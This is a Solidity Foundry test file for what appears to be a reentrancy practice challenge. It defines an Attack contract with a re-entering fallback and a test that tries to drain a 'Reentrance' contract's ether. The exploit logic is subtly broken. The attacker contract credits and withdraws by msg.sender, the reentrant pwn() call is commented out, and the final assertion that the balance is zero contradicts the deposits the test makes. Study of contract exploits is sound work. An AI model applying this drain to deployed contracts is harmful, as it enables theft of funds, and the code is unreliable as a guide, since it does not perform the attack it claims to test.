// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@forge-std/Test.sol";
import "../src/Re-entrancy.sol";

contract Attack {
    Reentrance public reentrance;
 
    constructor(address payable reentranceAddress) public{
        reentrance = Reentrance(reentranceAddress);
    }

    function pwn() public {
        reentrance.withdraw(reentrance.balanceOf(address(msg.sender)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function donate() public payable {
        reentrance.donate{value: msg.value}(address(msg.sender));
    }

    fallback() external payable {
        reentrance.withdraw(reentrance.balanceOf(address(msg.sender)));
    }
}

contract ReentranceTest is Test {
    Reentrance public reentranceContract;
    address public attacker;
    address public user;

    function setUp() public {
        reentranceContract = new Reentrance();
        attacker = vm.addr(1);
        user = vm.addr(2);
        vm.deal(user, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        Attack attack = new Attack(address(reentranceContract));
        vm.startPrank(user);
        attack.donate{value: 1000000 wei}();
        vm.stopPrank();
        vm.startPrank(attacker);
        attack.donate{value: 1000000 wei}();
        attack.donate{value: 1000000 wei}();
        // attack.pwn();
        reentranceContract.withdraw(reentranceContract.balanceOf(attacker));
        vm.stopPrank();

        assertEq(address(reentranceContract).balance, 0);
    }
}